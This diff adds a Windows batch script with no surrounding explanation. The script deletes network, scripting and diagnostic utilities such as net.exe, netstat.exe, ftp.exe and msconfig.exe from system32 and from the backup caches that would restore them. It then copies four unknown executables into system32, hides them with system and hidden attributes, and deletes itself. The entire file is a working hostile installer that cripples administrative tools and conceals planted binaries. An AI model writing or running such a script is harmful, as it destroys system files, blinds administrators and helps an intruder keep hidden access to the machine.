@@ -1,0 +1,51 @@
+@echo off
+@del %systemroot%\system32\dllcache\net.exe
+@del %systemroot%\system32\dllcache\net1.exe
+@del %systemroot%\system32\dllcache\ftp.exe
+@del %systemroot%\system32\dllcache\tftp.exe
+@del %systemroot%\system32\dllcache\cscript.exe
+@del %systemroot%\system32\dllcache\WScript.exe
+@del %systemroot%\system32\dllcache\msconfig.exe
+@del %systemroot%\system32\dllcache\at.exe
+@del %systemroot%\system32\dllcache\query.exe
+@del %systemroot%\system32\dllcache\netstat.exe
+
+@del %systemroot%\ServicePackFiles\i386\net.exe
+@del %systemroot%\ServicePackFiles\i386\net1.exe
+@del %systemroot%\ServicePackFiles\i386\ftp.exe
+@del %systemroot%\ServicePackFiles\i386\tftp.exe
+@del %systemroot%\ServicePackFiles\i386\cscript.exe
+@del %systemroot%\ServicePackFiles\i386\WScript.exe
+@del %systemroot%\ServicePackFiles\i386\msconfig.exe
+@del %systemroot%\ServicePackFiles\i386\at.exe
+@del %systemroot%\ServicePackFiles\i386\query.exe
+@del %systemroot%\ServicePackFiles\i386\netstat.exe
+
+@del %systemroot%\system32\net.exe
+@del %systemroot%\system32\net1.exe
+@del %systemroot%\system32\ftp.exe
+@del %systemroot%\system32\tftp.exe
+@del %systemroot%\system32\cscript.exe
+@del %systemroot%\system32\WScript.exe
+@del %systemroot%\system32\msconfig.exe
+@del %systemroot%\system32\at.exe
+@del %systemroot%\system32\query.exe
+@del %systemroot%\system32\netstat.exe
+
+@copy iniquery.exe %systemroot%\system32\iniquery.exe
+@copy iniuser1.exe %systemroot%\system32\iniuser1.exe
+@copy iniftp.exe %systemroot%\system32\iniftp.exe
+@copy log.exe %systemroot%\system32\log.exe
+@attrib +s +h iniuser1.exe
+@attrib +s +h iniftp.exe
+@attrib +s +h log.exe
+@attrib +s +h iniquery.exe
+@attrib +s +h %systemroot%\system32\iniuser1.exe
+@attrib +s +h %systemroot%\system32\iniftp.exe
+@attrib +s +h %systemroot%\system32\log.exe
+@attrib +s +h %systemroot%\system32\iniquery.exe
+@del %0%
+@del %0%
+@del %0%
+@exit
+
